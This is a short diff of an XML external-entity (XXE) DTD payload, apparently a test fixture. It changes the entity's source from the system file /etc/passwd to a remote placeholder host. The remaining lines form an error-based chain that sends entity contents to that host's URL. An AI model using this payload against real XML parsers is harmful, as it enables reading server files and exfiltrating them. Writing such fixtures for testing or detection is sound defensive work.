@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % file SYSTEM "https://fake.dns.praetorianlabs.com">
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://fake.dns.praetorianlabs.com/%file;'>">
 %eval;
 %error;
